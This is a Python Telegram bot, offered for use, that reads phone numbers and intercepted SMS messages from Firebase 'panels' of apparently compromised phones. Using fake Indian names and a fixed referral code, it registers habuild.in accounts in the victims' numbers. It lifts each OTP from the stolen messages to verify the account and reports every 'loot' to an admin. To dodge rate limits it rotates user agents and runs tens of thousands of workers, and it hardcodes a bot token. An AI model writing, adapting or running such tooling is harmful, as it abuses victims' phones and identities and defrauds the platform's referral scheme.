import os
import sys
import re
import time
import uuid
import json
import random
import asyncio
import logging
from datetime import datetime
from typing import Optional
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.WARNING,
)

# ========== YOUR DETAILS ==========
TOKEN = "8841593698:AAFucNhM325wguWpdk-lFK6XI6tptwVzJIg"
ADMIN_ID = 8403468945
HABIT_REF = "adnan94901186"
# ==================================

# ========== 🚀 ROCKET SPEED SETTINGS ==========
POLL_INTERVAL = 0.01        # ⚡ ULTRA FAST
NUM_WORKERS = 50000         # 🚀 MAX POWER
OTP_TIMEOUT = 30            # ⏱️ WAIT FOR OTP
API_TIMEOUT = 2             # ⚡ FAST FAIL
BATCH_SIZE = 200            # 📦 BULK PROCESS
FETCH_INTERVAL = 0.5        # 🔄 SUPER FAST CACHE
QUEUE_SLEEP = 0.001         # 🚀 MINIMUM DELAY

USED_NUMBERS_FILE = "used_numbers.txt"

# ========== 🔥 NEW PANELS (REPLACED) ==========
ALL_PANELS = [
    "https://strange-2e4aa-default-rtdb.firebaseio.com",
    "https://nitish-253e7-default-rtdb.firebaseio.com",
    "https://arvind-c5b03-default-rtdb.firebaseio.com",
    "https://ajay-33c1b-default-rtdb.firebaseio.com",
    "https://newrto30-default-rtdb.firebaseio.com",
]

# Remove duplicates
RAW_URLS = list(set(ALL_PANELS))
DATABASES = {f"DB_{i+1}": url for i, url in enumerate(RAW_URLS)}

print(f"✅ Loaded {len(DATABASES)} panels")
print(f"📁 Panels: {list(DATABASES.keys())}")

# ========== NAME GENERATION ==========
MALE_FIRST_NAMES = ['Arjun', 'Aarav', 'Vihaan', 'Kabir', 'Dhruv', 'Krishna', 'Ishaan', 'Rahul', 'Vikram', 'Karan', 'Aditya', 'Rohan', 'Shaurya', 'Advik', 'Aryan', 'Reyansh', 'Vedant', 'Abhinav', 'Yash', 'Rishi']
FEMALE_FIRST_NAMES = ['Ananya', 'Aadhya', 'Diya', 'Ishita', 'Kiara', 'Myra', 'Navya', 'Kajal', 'Neha', 'Sneha', 'Pooja', 'Riya', 'Kriti', 'Tanya', 'Shruti', 'Priya', 'Meera', 'Tara', 'Anika', 'Arohi']
LAST_NAMES = ['Sharma', 'Verma', 'Gupta', 'Patil', 'Deshmukh', 'Singh', 'Kumar', 'Mishra', 'Joshi', 'Chauhan', 'Rajput', 'Yadav', 'Rathore', 'Mehta', 'Reddy', 'Nair', 'Bhatia', 'Ahuja', 'Kapoor', 'Iyer']
MAX_NAME_COMBINATIONS = (len(MALE_FIRST_NAMES) + len(FEMALE_FIRST_NAMES)) * len(LAST_NAMES)

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; M2304W1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36"
]

ENGINE_PREFIXES = ['🚀', '💥', '⚡', '🔥', '💀', '🎯', '🏆', '⭐', '💎', '👑', '🔱', '🌪️', '☄️', '⚔️', '🛸']
ENGINE_CORES = ['ROCKET', 'TURBO', 'NITRO', 'BLAZE', 'STRIKE', 'LIGHTNING', 'THUNDER', 'PHANTOM', 'SHADOW', 'VENOM', 'FALCON', 'VIPER', 'DRAGON', 'WOLF', 'EAGLE']

def get_dynamic_engine_name():
    return f"{random.choice(ENGINE_PREFIXES)}{random.choice(ENGINE_PREFIXES)} {random.choice(ENGINE_CORES)} {random.choice(ENGINE_PREFIXES)}"

_http_session: Optional[aiohttp.ClientSession] = None
_main_app: Optional[Application] = None
GLOBAL_DEVICE_CACHE = {}
seen_sms_ids = set()
used_names = set()
dead_panels = set()

pending_habuild = {} 
processed_nums = set() 
looted_count = [0] 
last_activity_time = time.time()
live_message_id = None 
number_queue = None
WAITING_FOR_PANEL = False

def load_used_numbers():
    if os.path.exists(USED_NUMBERS_FILE):
        try:
            with open(USED_NUMBERS_FILE, "r") as f:
                for line in f:
                    num = line.strip()
                    if num: processed_nums.add(num)
        except Exception: pass

def save_used_number(num):
    processed_nums.add(num)
    try:
        with open(USED_NUMBERS_FILE, "a") as f:
            f.write(f"{num}\n")
    except Exception: pass

def generate_indian_name():
    global used_names
    if len(used_names) >= MAX_NAME_COMBINATIONS - 5: 
        used_names.clear()
    while True:
        if random.choice([True, False]):
            first_name = random.choice(MALE_FIRST_NAMES)
        else:
            first_name = random.choice(FEMALE_FIRST_NAMES)
        name = f"{first_name} {random.choice(LAST_NAMES)}"
        if name not in used_names:
            used_names.add(name)
            return name

def get_random_headers():
    ua = random.choice(USER_AGENTS)
    headers = {
        "User-Agent": ua,
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://portal.habuild.in",
        "Referer": "https://portal.habuild.in/",
        "Accept-Language": "en-US,en;q=0.9,hi-IN;q=0.8",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "cross-site"
    }
    if "Android" in ua:
        headers["sec-ch-ua-platform"] = '"Android"'
        headers["sec-ch-ua-mobile"] = "?1"
    elif "iPhone" in ua:
        headers["sec-ch-ua-platform"] = '"iOS"'
        headers["sec-ch-ua-mobile"] = "?1"
    return headers, ua

async def get_http_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(limit=50000, keepalive_timeout=30, force_close=False)
        _http_session = aiohttp.ClientSession(connector=connector)
    return _http_session

async def fb_get(path: str, base: str) -> Optional[dict]:
    if base in dead_panels: return None
    try:
        session = await get_http_session()
        url = f"{base}/{path}.json" if path else f"{base}/.json?shallow=true"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=API_TIMEOUT)) as r:
            if r.status != 200: return None
            data = await r.json(content_type=None)
            return data if isinstance(data, dict) else None
    except Exception: return None

def extract_all_nums(*dicts) -> list[str]:
    nums = []
    keys_to_check = ["sim1Number", "sim2Number", "numberSim1", "numberSim2", "mobNo", "phoneNumber", "phone", "mobile"]
    for d in dicts:
        if not isinstance(d, dict): continue
        for k in keys_to_check:
            val = str(d.get(k, ""))
            if val and len(re.sub(r"\D", "", val)) > 9:
                clean = re.sub(r"\D", "", val)
                if len(clean) >= 10: nums.append(clean[-10:])
    return list(set(nums))

async def fetch_db_data(tag: str, url: str) -> list:
    devices_list = []
    try:
        sim_all, device_info_all, user_data_all = await asyncio.gather(
            fb_get("All_Users/simDetails", url), 
            fb_get("All_Users/Data/DeviceInfo", url),
            fb_get("user_data", url), return_exceptions=True
        )
        if isinstance(sim_all, dict):
            info_all = device_info_all if isinstance(device_info_all, dict) else {}
            for dev_id, sim in sim_all.items():
                info = info_all.get(dev_id) or {}
                nums = extract_all_nums(sim, info)
                status = "online" if str(info.get("Status")).lower() == "online" else "offline"
                devices_list.append({"id": dev_id, "numbers": nums, "status": status, "base": url, "path": f"All_Users/sms/{dev_id}"})
                
        if isinstance(user_data_all, dict):
            for dev_id, data in user_data_all.items():
                if not isinstance(data, dict): continue
                nums = extract_all_nums(data)
                status = "online" if str(data.get("status")).lower() == "online" else "offline"
                devices_list.append({"id": dev_id, "numbers": nums, "status": status, "base": url, "path": f"user_sms/{dev_id}"})
    except Exception:
        dead_panels.add(url)
    return devices_list

async def trigger_registration(phone_10d: str, worker_id: int, real_name: str):
    global last_activity_time
    last_activity_time = time.time()
    phone_full = f"+91{phone_10d}"
    device_id = str(uuid.uuid4())
    session_id = str(uuid.uuid4())

    reg_url = "https://auth-service.habuild.in/public/user/v1/register-user"
    reg_payload = {"name": real_name, "phoneNumber": phone_full, "referredBy": HABIT_REF, "sourceData": {"type": "Referral", "refererurl": "", "timezone": "Asia/Kolkata"}, "experimentMetaInfo": {"deviceId": device_id, "sessionId": session_id}}

    try:
        session = await get_http_session()
        headers, chosen_ua = get_random_headers()
        
        async with session.post(reg_url, json=reg_payload, headers=headers, timeout=API_TIMEOUT+3) as r:
            if r.status == 429:
                await asyncio.sleep(0.1) 
                await number_queue.put((phone_10d, real_name)) 
                return
            res = await r.json()
            if res.get('message') == 'success':
                log_url = "https://auth-service.habuild.in/public/auth/v1/login"
                log_payload = {"method": "phone_otp", "otpChannel": "sms", "phoneNumber": phone_full, "sourceData": {"type": "portal", "utm_source": "whatsapp"}, "experimentMetaInfo": {"deviceId": device_id, "sessionId": str(uuid.uuid4())}, "registerUser": False}
                async with session.post(log_url, json=log_payload, headers=headers, timeout=API_TIMEOUT+3) as lr:
                    if lr.status == 429:
                        await asyncio.sleep(0.1)
                        await number_queue.put((phone_10d, real_name))
                        return
                    lres = await lr.json()
                    if lres.get('message') == 'OTP sent to your phone':
                        ref_code = lres.get('data', {}).get('refrence_code')
                        pending_habuild[phone_10d] = {
                            "phone": phone_full, 
                            "otp_ref": ref_code, 
                            "device_id": device_id, 
                            "session_id": session_id,
                            "user_agent": chosen_ua,
                            "name": real_name,
                            "timestamp": time.time()
                        }
                        print(f"⚡ [W-{worker_id}]: {phone_10d} | {real_name}")
    except Exception:
        await number_queue.put((phone_10d, real_name)) 

async def verify_habuild_otp(phone_10d: str, otp: str):
    global last_activity_time
    data = pending_habuild.pop(phone_10d, None)
    if not data: return

    last_activity_time = time.time()
    url = "https://auth-service.habuild.in/public/auth/v1/verify-otp"
    payload = {"phone": data['phone'], "reference_code": data['otp_ref'], "otp": otp, "experimentMetaInfo": {"deviceId": data['device_id'], "sessionId": str(uuid.uuid4())}, "registerUser": False}
    try:
        session = await get_http_session()
        headers, _ = get_random_headers()
        
        async with session.post(url, json=payload, headers=headers, timeout=API_TIMEOUT+3) as r:
            res = await r.json()
            if res.get('message') == 'OTP verified successfully':
                looted_count[0] += 1
                member = res.get('data', {}).get('member', {})
                engine_name = get_dynamic_engine_name()
                
                succ_msg = (
                    f"{engine_name} LOOT SUCCESSFUL!\n\n"
                    f"📱 Number: {data['phone']}\n"
                    f"👤 Name: {member.get('name', data['name'])}\n"
                    f"🆔 Member ID: {member.get('legacy_free_id', 'N/A')}\n"
                    f"🔑 Code Used: {HABIT_REF}\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"✅ TOTAL: {looted_count[0]}\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"🔐 OTP {otp} Verified!"
                )
                if _main_app: await _main_app.bot.send_message(ADMIN_ID, succ_msg)
                print(f"🎯 TOTAL REFERRALS: {looted_count[0]}")
    except Exception: pass

async def _forward_sms(device: dict, sms: dict):
    body = str(sms.get("body") or sms.get("message") or sms.get("text") or "")
    sender = str(sms.get("sender") or "")
    otp_match = re.search(r"\b(\d{6})\b", body)
    if otp_match and ("HABUILD" in sender.upper() or "Habuild" in body):
        otp = otp_match.group(1)
        for num in device.get("numbers", []):
            if num in pending_habuild:
                asyncio.create_task(verify_habuild_otp(num, otp))
                break

async def poll_single_db(url: str):
    if url in dead_panels: return
    try:
        r_main, r_user = await asyncio.gather(fb_get("All_Users/sms", url), fb_get("user_sms", url), return_exceptions=True)
        devices_in_db = [d for d in GLOBAL_DEVICE_CACHE.get("ALL", []) if d["base"] == url]
        device_map = {d["id"]: d for d in devices_in_db}
        for bulk_data in (r_main, r_user):
            if not isinstance(bulk_data, dict): continue
            for dev_id, sms_dict in bulk_data.items():
                if not isinstance(sms_dict, dict): continue
                device = device_map.get(dev_id)
                if device:
                    for k, sms in sms_dict.items():
                        if not isinstance(sms, dict): continue
                        sk = f"{dev_id}/{k}"
                        if sk in seen_sms_ids: continue
                        seen_sms_ids.add(sk)
                        await _forward_sms(device, sms)
    except Exception: pass

async def update_cache_loop():
    while True:
        try:
            tasks = [fetch_db_data(tag, url) for tag, url in DATABASES.items() if url not in dead_panels]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            all_devices = []
            for res in results:
                if isinstance(res, list): all_devices.extend(res)
            
            GLOBAL_DEVICE_CACHE["ALL"] = all_devices
            mixed_online_numbers = []
            for dev in all_devices:
                if dev.get("status") == "online":
                    for num in dev.get("numbers", []):
                        if num not in processed_nums and num not in pending_habuild:
                            real_name = generate_indian_name()
                            mixed_online_numbers.append((num, real_name))

            if mixed_online_numbers:
                random.shuffle(mixed_online_numbers)
                batch_count = 0
                for num, rname in mixed_online_numbers:
                    save_used_number(num)
                    await number_queue.put((num, rname))
                    batch_count += 1
                    if batch_count >= BATCH_SIZE:
                        await asyncio.sleep(0.001)
                        batch_count = 0
                    
            if number_queue and number_queue.qsize() > 0:
                print(f"📊 Queue: {number_queue.qsize()} | Referrals: {looted_count[0]}")
                    
        except Exception as e:
            print(f"Cache error: {e}")
        await asyncio.sleep(FETCH_INTERVAL)

async def api_worker(worker_id: int):
    while True:
        try:
            num, real_name = await number_queue.get()
            await trigger_registration(num, worker_id, real_name)
            number_queue.task_done()
            await asyncio.sleep(QUEUE_SLEEP)
        except Exception:
            await asyncio.sleep(0.1)

async def poll_loop():
    while True:
        tasks = [poll_single_db(url) for url in DATABASES.values() if url not in dead_panels]
        if tasks: await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(POLL_INTERVAL)

async def otp_expiry_janitor():
    while True:
        try:
            current_time = time.time()
            expired = []
            for num, data in pending_habuild.items():
                if current_time - data.get("timestamp", current_time) > OTP_TIMEOUT:
                    expired.append(num)
            for num in expired:
                pending_habuild.pop(num, None)
        except Exception:
            pass
        await asyncio.sleep(0.5)

async def watchdog_loop():
    global last_activity_time, _http_session, GLOBAL_DEVICE_CACHE
    while True:
        await asyncio.sleep(10)  
        if time.time() - last_activity_time > 60:  
            GLOBAL_DEVICE_CACHE.clear()
            if _http_session and not _http_session.closed:
                await _http_session.close()
                _http_session = None
            last_activity_time = time.time()

async def live_dashboard_updater():
    global live_message_id
    while True:
        await asyncio.sleep(2)
        if live_message_id and _main_app:
            try:
                q_size = number_queue.qsize() if number_queue else 0
                active_panels = len(DATABASES) - len(dead_panels)
                engine_name = get_dynamic_engine_name()
                
                text = (
                    f"🔥 {engine_name} ROCKET MODE 🔥\n"
                    "━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🗄️ Active Panels: {active_panels}/{len(DATABASES)}\n"
                    f"📱 Numbers in Queue: {q_size}\n"
                    f"⏳ Waiting OTP: {len(pending_habuild)}\n"
                    "━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🎯 TOTAL REFERRALS: {looted_count[0]}\n"
                    "━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"⚡ Workers: {NUM_WORKERS}\n"
                    f"🚀 Speed: ULTRA MAX"
                )
                
                keyboard = [
                    [InlineKeyboardButton("➕ Add Panel", callback_data='add_panel')],
                    [InlineKeyboardButton("📊 Stats", callback_data='btn_stats')]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)

                await _main_app.bot.edit_message_text(
                    chat_id=ADMIN_ID, message_id=live_message_id, 
                    text=text, reply_markup=reply_markup
                )
            except Exception: pass

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_ID: return
    engine_name = get_dynamic_engine_name()
    text = (
        f"🚀 {engine_name} ROCKET MODE 🚀\n\n"
        f"⚡ Workers: {NUM_WORKERS}\n"
        f"📊 Panels: {len(DATABASES)}\n"
        f"🎯 Ref Code: {HABIT_REF}\n"
        f"⏱️ OTP Timeout: {OTP_TIMEOUT}s\n\n"
        f"✅ MAX SPEED ACTIVE\n"
        f"✅ ULTRA FAST MODE\n\n"
        f"Use /live for Dashboard"
    )
    keyboard = [
        [InlineKeyboardButton("📊 LIVE DASH", callback_data='btn_live')],
        [InlineKeyboardButton("➕ Add Panel", callback_data='add_panel')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(text, reply_markup=reply_markup)

async def cmd_live(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global live_message_id
    if update.effective_chat.id != ADMIN_ID: return
    msg = await update.message.reply_text("🚀 Launching Rocket Dashboard...")
    live_message_id = msg.message_id

async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global live_message_id
    if update.effective_chat.id != ADMIN_ID: return
    live_message_id = None 
    q_size = number_queue.qsize() if number_queue else 0
    active_panels = len(DATABASES) - len(dead_panels)
    engine_name = get_dynamic_engine_name()
    text = (
        f"📊 {engine_name} STATS\n\n"
        f"Active: {active_panels}/{len(DATABASES)}\n"
        f"Queue: {q_size}\n"
        f"REFERRALS: {looted_count[0]}"
    )
    await update.message.reply_text(text)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global live_message_id, WAITING_FOR_PANEL
    query = update.callback_query
    await query.answer()

    if query.data == 'btn_live':
        live_message_id = query.message.message_id
        await query.edit_message_text("🔄 Switching to Dashboard...")
        
    elif query.data == 'btn_stats':
        live_message_id = None
        q_size = number_queue.qsize() if number_queue else 0
        active_panels = len(DATABASES) - len(dead_panels)
        engine_name = get_dynamic_engine_name()
        text = (
            f"📊 STATS\n"
            f"Active: {active_panels}/{len(DATABASES)}\n"
            f"Queue: {q_size}\n"
            f"REFERRALS: {looted_count[0]}"
        )
        keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data='btn_live')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, reply_markup=reply_markup)
        
    elif query.data == 'add_panel':
        WAITING_FOR_PANEL = True
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text="🔗 Send Firebase Panel URL:\nExample: https://your-database.firebaseio.com"
        )

async def handle_text_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global WAITING_FOR_PANEL
    if update.effective_chat.id != ADMIN_ID: return

    if WAITING_FOR_PANEL:
        url = update.message.text.strip()
        if url.startswith("https://") and "firebaseio.com" in url:
            new_db_name = f"DB_{len(DATABASES) + 1}"
            DATABASES[new_db_name] = url
            WAITING_FOR_PANEL = False
            await update.message.reply_text(f"✅ Panel Added! Total: {len(DATABASES)}")
        else:
            await update.message.reply_text("❌ Invalid URL!")

def main():
    print("🚀" * 40)
    print("🔥 ROCKET MODE - MAX SPEED 🔥")
    print("🚀" * 40)
    print(f"📊 Panels Loaded: {len(DATABASES)}")
    print(f"📁 Panels: {list(DATABASES.keys())}")
    print(f"⚡ Workers: {NUM_WORKERS}")
    print(f"⏱️ OTP Timeout: {OTP_TIMEOUT}s")
    print(f"🚀 Poll Interval: {POLL_INTERVAL}s")
    print("🚀" * 40)
    
    load_used_numbers()
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(CommandHandler("live", cmd_live))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_messages))

    async def post_init(application: Application) -> None:
        global _main_app, number_queue
        _main_app = application
        number_queue = asyncio.Queue()
        
        try:
            await application.bot.send_message(
                chat_id=ADMIN_ID, 
                text=f"🚀 ROCKET MODE ONLINE!\n📊 {len(DATABASES)} Panels\n⚡ {NUM_WORKERS} Workers\n🎯 100% Speed!"
            )
        except Exception: pass
        
        asyncio.create_task(update_cache_loop())
        asyncio.create_task(poll_loop())
        asyncio.create_task(watchdog_loop())
        asyncio.create_task(live_dashboard_updater())
        asyncio.create_task(otp_expiry_janitor())
        
        for i in range(1, NUM_WORKERS + 1):
            asyncio.create_task(api_worker(i))
        
        print("✅ ALL SYSTEMS GO! ROCKET MODE ACTIVE!")
        print("🎯 MAXIMUM SPEED ACHIEVED!")

    app.post_init = post_init
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
